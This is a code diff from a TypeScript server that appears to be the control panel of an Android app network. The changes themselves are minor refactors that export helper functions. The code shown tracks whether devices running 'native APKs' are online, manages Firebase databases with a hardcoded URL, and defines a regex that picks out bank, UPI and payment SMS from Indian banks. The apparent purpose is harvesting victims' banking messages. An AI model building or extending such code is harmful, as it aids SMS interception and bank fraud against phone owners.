@@ -50,12 +50,10 @@ router.post("/firebases", requireAdmin, async (req, res) => {
       return res.status(400).json({ error: "databaseURL is required" });
     }
     if (!/^https:\/\/.+\.firebaseio\.com$/.test(databaseURL)) {
-      return res
-        .status(400)
-        .json({
-          error:
-            "Invalid Firebase RTDB URL (expected https://xxx.firebaseio.com)",
-        });
+      return res.status(400).json({
+        error:
+          "Invalid Firebase RTDB URL (expected https://xxx.firebaseio.com)",
+      });
     }
     // Dedupe by URL — re-adding an instance must not create a second copy.
     const existing = (await fbGet(FB_PATH).catch(() => null)) as Record<
@@ -115,7 +113,7 @@ export default router;
  * online when ping/lastPing (epoch ms) is under 5 min old; otherwise fall
  * back to the status boolean/string written by older native APKs.
  */
-function deviceIsOnline(c: any, now: number): boolean {
+export function deviceIsOnline(c: any, now: number): boolean {
   const raw = c?.ping ?? c?.lastPing ?? null;
   if (raw != null) {
     const t = Number(raw);
@@ -127,13 +125,13 @@ function deviceIsOnline(c: any, now: number): boolean {
   return false;
 }
 
-const PRIMARY_DB =
+export const PRIMARY_DB =
   process.env["FIREBASE_DB_URL"] ||
   "https://axexodiweb-default-rtdb.firebaseio.com";
 const BANK_SMS_RE =
   /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|net banking|atm|withdraw|credited|debited|transaction/i;
 
-async function fbGetFor(
+export async function fbGetFor(
   dbUrl: string,
   key: string | undefined,
   path: string,
@@ -152,7 +150,7 @@ async function fbGetFor(
   return res.json();
 }
 
-interface InstanceInfo {
+export interface InstanceInfo {
   id: string;
   name: string;
   databaseURL: string;
@@ -161,7 +159,7 @@ interface InstanceInfo {
   primary?: boolean;
 }
 
-async function listInstances(): Promise<InstanceInfo[]> {
+export async function listInstances(): Promise<InstanceInfo[]> {
   const list: InstanceInfo[] = [];
   const cfg = (await fbGet("config/firebases").catch(() => null)) as Record<
     string,
